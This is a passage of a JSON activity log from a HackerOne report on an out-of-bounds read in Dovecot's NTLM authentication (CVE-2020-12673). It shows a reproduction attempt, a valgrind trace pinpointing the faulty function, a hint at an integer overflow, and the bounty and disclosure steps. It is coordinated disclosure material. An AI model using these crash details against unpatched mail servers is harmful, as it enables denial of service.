(7.5)","old_severity_id":712470,"new_severity_id":712888},"actor":{"username":"akituomi","cleared":false,"url":"/akituomi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/216/805d230879c8e3757d37eedddaadf9efed0a8094_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7907932,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Hi!\n\nI tried to reproduce this issue with 2.3.10:\n\n```\nMay 06 09:33:37 master: Info: Dovecot v2.3.10.1 (a3d0e1171f) starting up for imap, pop3, lmtp (core dumps disabled)\nMay 06 09:33:40 imap-login: Debug: Growing pool 'imap login commands' with: 1024\nMay 06 09:33:40 auth: Debug: Loading modules from directory: /home/cmouse/dovecot23/lib/dovecot/auth\nMay 06 09:33:40 auth: Debug: Module loaded: /home/cmouse/dovecot23/lib/dovecot/auth/lib20_auth_var_expand_crypt.so\nMay 06 09:33:40 auth: Debug: Read auth token secret from /home/cmouse/dovecot23/var/run/dovecot/auth-token-secret.dat\nMay 06 09:33:40 auth: Debug: passwd-file /home/cmouse/passwd: Read 2 users in 0 secs\nMay 06 09:33:40 auth: Debug: auth client connected (pid=12548)\nMay 06 09:33:40 auth: Debug: client in: AUTH\t1\tNTLM\tservice=imap\tsecured\tsession=/mLa8fSkpod/AAAB\tlip=127.0.0.1\trip=127.0.0.1\tlport=143\trport=34726\nMay 06 09:33:40 auth: Debug: client passdb out: CONT\t1\t\nMay 06 09:33:40 auth: Debug: client in: CONT\u003chidden\u003e\nMay 06 09:33:40 auth: Debug: client passdb out: CONT\t1\tTlRMTVNTUAACAAAAAAAAAAAAAAACAoAAerVeu1N7D9YAAAAAAAAAABIAEgAwAAAAAwAKAGQAZQB2ADAANAAAAAAA\nMay 06 09:33:40 auth: Debug: client in: CONT\u003chidden\u003e\nMay 06 09:33:40 auth: Debug: Growing data stack by 65536 as 'auth-client-connection.c:310' reaches 17616 bytes from 12 allocations.\nMay 06 09:33:40 auth: Debug: passwd-file(orange,127.0.0.1,\u003c/mLa8fSkpod/AAAB\u003e): Performing passdb lookup\nMay 06 09:33:40 auth: Debug: passwd-file(orange,127.0.0.1,\u003c/mLa8fSkpod/AAAB\u003e): lookup: user=orange file=/home/cmouse/passwd\nMay 06 09:33:40 auth: Debug: passwd-file(orange,127.0.0.1,\u003c/mLa8fSkpod/AAAB\u003e): Finished passdb lookup\nMay 06 09:33:40 auth: Debug: passwd-file(orange,127.0.0.1,\u003c/mLa8fSkpod/AAAB\u003e): Performing passdb lookup\nMay 06 09:33:40 auth: Debug: passwd-file(orange,127.0.0.1,\u003c/mLa8fSkpod/AAAB\u003e): lookup: user=orange file=/home/cmouse/passwd\nMay 06 09:33:40 auth: Debug: passwd-file(orange,127.0.0.1,\u003c/mLa8fSkpod/AAAB\u003e): Finished passdb lookup\nMay 06 09:33:40 auth: Error: ntlm(orange,127.0.0.1,\u003c/mLa8fSkpod/AAAB\u003e): LM response length is too small\nMay 06 09:33:40 auth: Debug: auth(orange,127.0.0.1,\u003c/mLa8fSkpod/AAAB\u003e): Auth request finished\nMay 06 09:33:42 imap-login: Info: Aborted login (auth failed, 1 attempts in 2 secs): user=\u003corange\u003e, method=NTLM, rip=127.0.0.1, lip=127.0.0.1, secured, session=\u003c/mLa8fSkpod/AAAB\u003e\nMay 06 09:33:42 auth: Debug: client passdb out: FAIL\t1\tuser=orange\n```\n\nas you can see it did not crash. Is there something I overlooked?","markdown_message":"\u003cp\u003eHi!\u003c/p\u003e\n\n\u003cp\u003eI tried to reproduce this issue with 2.3.10:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eMay 06 09:33:37 master: Info: Dovecot v2.3.10.1 (a3d0e1171f) starting up for imap, pop3, lmtp (core dumps disabled)\nMay 06 09:33:40 imap-login: Debug: Growing pool \u0026#39;imap login commands\u0026#39; with: 1024\nMay 06 09:33:40 auth: Debug: Loading modules from directory: /home/cmouse/dovecot23/lib/dovecot/auth\nMay 06 09:33:40 auth: Debug: Module loaded: /home/cmouse/dovecot23/lib/dovecot/auth/lib20_auth_var_expand_crypt.so\nMay 06 09:33:40 auth: Debug: Read auth token secret from /home/cmouse/dovecot23/var/run/dovecot/auth-token-secret.dat\nMay 06 09:33:40 auth: Debug: passwd-file /home/cmouse/passwd: Read 2 users in 0 secs\nMay 06 09:33:40 auth: Debug: auth client connected (pid=12548)\nMay 06 09:33:40 auth: Debug: client in: AUTH    1   NTLM    service=imap    secured session=/mLa8fSkpod/AAAB    lip=127.0.0.1   rip=127.0.0.1   lport=143   rport=34726\nMay 06 09:33:40 auth: Debug: client passdb out: CONT    1   \nMay 06 09:33:40 auth: Debug: client in: CONT\u0026lt;hidden\u0026gt;\nMay 06 09:33:40 auth: Debug: client passdb out: CONT    1   TlRMTVNTUAACAAAAAAAAAAAAAAACAoAAerVeu1N7D9YAAAAAAAAAABIAEgAwAAAAAwAKAGQAZQB2ADAANAAAAAAA\nMay 06 09:33:40 auth: Debug: client in: CONT\u0026lt;hidden\u0026gt;\nMay 06 09:33:40 auth: Debug: Growing data stack by 65536 as \u0026#39;auth-client-connection.c:310\u0026#39; reaches 17616 bytes from 12 allocations.\nMay 06 09:33:40 auth: Debug: passwd-file(orange,127.0.0.1,\u0026lt;/mLa8fSkpod/AAAB\u0026gt;): Performing passdb lookup\nMay 06 09:33:40 auth: Debug: passwd-file(orange,127.0.0.1,\u0026lt;/mLa8fSkpod/AAAB\u0026gt;): lookup: user=orange file=/home/cmouse/passwd\nMay 06 09:33:40 auth: Debug: passwd-file(orange,127.0.0.1,\u0026lt;/mLa8fSkpod/AAAB\u0026gt;): Finished passdb lookup\nMay 06 09:33:40 auth: Debug: passwd-file(orange,127.0.0.1,\u0026lt;/mLa8fSkpod/AAAB\u0026gt;): Performing passdb lookup\nMay 06 09:33:40 auth: Debug: passwd-file(orange,127.0.0.1,\u0026lt;/mLa8fSkpod/AAAB\u0026gt;): lookup: user=orange file=/home/cmouse/passwd\nMay 06 09:33:40 auth: Debug: passwd-file(orange,127.0.0.1,\u0026lt;/mLa8fSkpod/AAAB\u0026gt;): Finished passdb lookup\nMay 06 09:33:40 auth: Error: ntlm(orange,127.0.0.1,\u0026lt;/mLa8fSkpod/AAAB\u0026gt;): LM response length is too small\nMay 06 09:33:40 auth: Debug: auth(orange,127.0.0.1,\u0026lt;/mLa8fSkpod/AAAB\u0026gt;): Auth request finished\nMay 06 09:33:42 imap-login: Info: Aborted login (auth failed, 1 attempts in 2 secs): user=\u0026lt;orange\u0026gt;, method=NTLM, rip=127.0.0.1, lip=127.0.0.1, secured, session=\u0026lt;/mLa8fSkpod/AAAB\u0026gt;\nMay 06 09:33:42 auth: Debug: client passdb out: FAIL    1   user=orange\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eas you can see it did not crash. Is there something I overlooked?\u003c/p\u003e\n","automated_response":false,"created_at":"2020-05-06T06:35:18.416Z","updated_at":"2020-05-06T06:35:18.416Z","actor":{"username":"akituomi","cleared":false,"url":"/akituomi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/216/805d230879c8e3757d37eedddaadf9efed0a8094_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7908048,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Hi, Could you run the PoC on a fresh Dovecot server? I just made a quick way to verify the bug. This crash is depended on memory layouts. \n\nAnother crash PoC is to trigger the integer overflow on [response_length](https://github.com/dovecot/core/blob/191321cc5d3489f48697c7212cddca6e1023c65b/src/auth/mech-ntlm.c#L118). It's more 100% stable and unrelated to the memory layout. If you want, I can take times to develop that tonight.  ","markdown_message":"\u003cp\u003eHi, Could you run the PoC on a fresh Dovecot server? I just made a quick way to verify the bug. This crash is depended on memory layouts. \u003c/p\u003e\n\n\u003cp\u003eAnother crash PoC is to trigger the integer overflow on \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fdovecot%2Fcore%2Fblob%2F191321cc5d3489f48697c7212cddca6e1023c65b%2Fsrc%2Fauth%2Fmech-ntlm.c%23L118\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eresponse_length\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. It\u0026#39;s more 100% stable and unrelated to the memory layout. If you want, I can take times to develop that tonight.  \u003c/p\u003e\n","automated_response":false,"created_at":"2020-05-06T06:49:58.586Z","updated_at":"2020-05-06T06:50:49.425Z","actor":{"username":"orange","cleared":false,"url":"/orange","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/051/3495315121602d0de9c4f6728fef03bc3b41d3fe_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7908079,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I can try if I can see it in valgring.","markdown_message":"\u003cp\u003eI can try if I can see it in valgring.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-05-06T06:52:32.040Z","updated_at":"2020-05-06T06:52:32.040Z","actor":{"username":"akituomi","cleared":false,"url":"/akituomi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/216/805d230879c8e3757d37eedddaadf9efed0a8094_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7908110,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yeah. I can see the issue with valgrind\n\n```\n==20703== Invalid read of size 1\n==20703==    at 0x175FD5: ntlmssp_t_str_i (ntlm-message.c:34)\n==20703==    by 0x1405AE: mech_ntlm_auth_continue (mech-ntlm.c:221)\n==20703==    by 0x12AD57: auth_request_continue (auth-request.c:653)\n==20703==    by 0x133E2A: auth_request_handler_auth_continue (auth-request-handler.c:716)\n==20703==    by 0x1226DF: auth_client_handle_line (auth-client-connection.c:228)\n==20703==    by 0x122A21: auth_client_input (auth-client-connection.c:311)\n==20703==    by 0x4D8B011: io_loop_call_io (ioloop.c:713)\n==20703==    by 0x4D8E06D: io_loop_handler_run_internal (ioloop-epoll.c:222)\n==20703==    by 0x4D8B29A: io_loop_handler_run (ioloop.c:765)\n==20703==    by 0x4D8B176: io_loop_run (ioloop.c:738)\n==20703==    by 0x4CB0E31: master_service_run (master-service.c:851)\n==20703==    by 0x1204E1: main (main.c:396)\n==20703==  Address 0xb183610 is 0 bytes after a block of size 2,048 alloc'd\n==20703==    at 0x4031B65: calloc (in /usr/lib/x86_64-linux-gnu/valgrind/vgpreload_memcheck-amd64-linux.so)\n==20703==    by 0x4D9A801: block_alloc (mempool-alloconly.c:368)\n==20703==    by 0x4D9A433: pool_alloconly_create (mempool-alloconly.c:249)\n==20703==    by 0x14068D: mech_ntlm_auth_new (mech-ntlm.c:241)\n==20703==    by 0x128ECA: auth_request_new (auth-request.c:131)\n==20703==    by 0x133742: auth_request_handler_auth_begin (auth-request-handler.c:551)\n==20703==    by 0x122610: auth_client_handle_line (auth-client-connection.c:220)\n==20703==    by 0x122A21: auth_client_input (auth-client-connection.c:311)\n==20703==    by 0x4D8B011: io_loop_call_io (ioloop.c:713)\n==20703==    by 0x4D8E06D: io_loop_handler_run_internal (ioloop-epoll.c:222)\n==20703==    by 0x4D8B29A: io_loop_handler_run (ioloop.c:765)\n==20703==    by 0x4D8B176: io_loop_run (ioloop.c:738)\n```","markdown_message":"\u003cp\u003eYeah. I can see the issue with valgrind\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e==20703== Invalid read of size 1\n==20703==    at 0x175FD5: ntlmssp_t_str_i (ntlm-message.c:34)\n==20703==    by 0x1405AE: mech_ntlm_auth_continue (mech-ntlm.c:221)\n==20703==    by 0x12AD57: auth_request_continue (auth-request.c:653)\n==20703==    by 0x133E2A: auth_request_handler_auth_continue (auth-request-handler.c:716)\n==20703==    by 0x1226DF: auth_client_handle_line (auth-client-connection.c:228)\n==20703==    by 0x122A21: auth_client_input (auth-client-connection.c:311)\n==20703==    by 0x4D8B011: io_loop_call_io (ioloop.c:713)\n==20703==    by 0x4D8E06D: io_loop_handler_run_internal (ioloop-epoll.c:222)\n==20703==    by 0x4D8B29A: io_loop_handler_run (ioloop.c:765)\n==20703==    by 0x4D8B176: io_loop_run (ioloop.c:738)\n==20703==    by 0x4CB0E31: master_service_run (master-service.c:851)\n==20703==    by 0x1204E1: main (main.c:396)\n==20703==  Address 0xb183610 is 0 bytes after a block of size 2,048 alloc\u0026#39;d\n==20703==    at 0x4031B65: calloc (in /usr/lib/x86_64-linux-gnu/valgrind/vgpreload_memcheck-amd64-linux.so)\n==20703==    by 0x4D9A801: block_alloc (mempool-alloconly.c:368)\n==20703==    by 0x4D9A433: pool_alloconly_create (mempool-alloconly.c:249)\n==20703==    by 0x14068D: mech_ntlm_auth_new (mech-ntlm.c:241)\n==20703==    by 0x128ECA: auth_request_new (auth-request.c:131)\n==20703==    by 0x133742: auth_request_handler_auth_begin (auth-request-handler.c:551)\n==20703==    by 0x122610: auth_client_handle_line (auth-client-connection.c:220)\n==20703==    by 0x122A21: auth_client_input (auth-client-connection.c:311)\n==20703==    by 0x4D8B011: io_loop_call_io (ioloop.c:713)\n==20703==    by 0x4D8E06D: io_loop_handler_run_internal (ioloop-epoll.c:222)\n==20703==    by 0x4D8B29A: io_loop_handler_run (ioloop.c:765)\n==20703==    by 0x4D8B176: io_loop_run (ioloop.c:738)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2020-05-06T06:56:57.361Z","updated_at":"2020-05-06T06:56:57.361Z","actor":{"username":"akituomi","cleared":false,"url":"/akituomi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/216/805d230879c8e3757d37eedddaadf9efed0a8094_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7908116,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yeah, thanks you!","markdown_message":"\u003cp\u003eYeah, thanks you!\u003c/p\u003e\n","automated_response":false,"created_at":"2020-05-06T06:57:40.251Z","updated_at":"2020-05-06T06:57:40.251Z","actor":{"username":"orange","cleared":false,"url":"/orange","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/051/3495315121602d0de9c4f6728fef03bc3b41d3fe_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7911126,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2020-05-06T10:52:09.951Z","updated_at":"2020-05-06T10:52:09.951Z","actor":{"username":"akituomi","cleared":false,"url":"/akituomi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/216/805d230879c8e3757d37eedddaadf9efed0a8094_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7920409,"is_internal":false,"editable":false,"type":"Activities::CveIdAdded","message":"","markdown_message":"","automated_response":false,"created_at":"2020-05-07T06:18:09.271Z","updated_at":"2020-05-07T06:18:09.271Z","cve_ids":["CVE-2020-12673"],"actor":{"username":"akituomi","cleared":false,"url":"/akituomi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/216/805d230879c8e3757d37eedddaadf9efed0a8094_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7920700,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2020-05-07T06:45:05.026Z","updated_at":"2020-05-07T06:45:05.026Z","additional_data":{"old_severity":"High (7.5)","new_severity":"Medium","old_severity_id":712888,"new_severity_id":713730},"actor":{"username":"akituomi","cleared":false,"url":"/akituomi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/216/805d230879c8e3757d37eedddaadf9efed0a8094_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7921091,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"While the issue CVSS score is high, we consider the fact that the NTLM component is not used widely and usually those setups are not exposed to internet either. Thank you for the excellent report!","markdown_message":"\u003cp\u003eWhile the issue CVSS score is high, we consider the fact that the NTLM component is not used widely and usually those setups are not exposed to internet either. Thank you for the excellent report!\u003c/p\u003e\n","automated_response":false,"created_at":"2020-05-07T06:53:10.480Z","updated_at":"2020-05-07T06:53:10.480Z","actor":{"url":"/open-xchange","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/JtYLEsu5yRZxGitSmAjeAFtK/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Open-Xchange"}},"bounty_amount":"450.0","bounty_currency":"usd","bonus_amount":"100.0","genius_execution_id":null,"team_handle":"open-xchange","collaborator":{"username":"orange","url":"/orange"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8118545,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"We will publish this once the code is out, this will take about a month.","markdown_message":"\u003cp\u003eWe will publish this once the code is out, this will take about a month.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-05-27T12:48:11.780Z","updated_at":"2020-05-27T12:48:11.780Z","actor":{"username":"akituomi","cleared":false,"url":"/akituomi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/216/805d230879c8e3757d37eedddaadf9efed0a8094_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"orange","url":"/orange"},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8922437,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-08-13T06:43:20.440Z","updated_at":"2020-08-13T06:43:20.440Z","first_to_agree":true,"actor":{"username":"akituomi","cleared":false,"url":"/akituomi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/216/805d230879c8e3757d37eedddaadf9efed0a8094_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8922442,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-08-13T06:43:49.836Z","updated_at":"2020-08-13T06:43:49.836Z","actor":{"username":"orange","cleared":false,"url":"/orange","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/051/3495315121602d0de9c4f6728fef03bc3b41d3fe_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8922443,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-08-13T06:43:49.878Z","updated_at":"2020-08-13T06:43:49.878Z","actor":{"username":"orange","cleared":false,"url":"/orange","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/051/3495315121602d0de9c4f6728fef03bc3b41d3fe_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}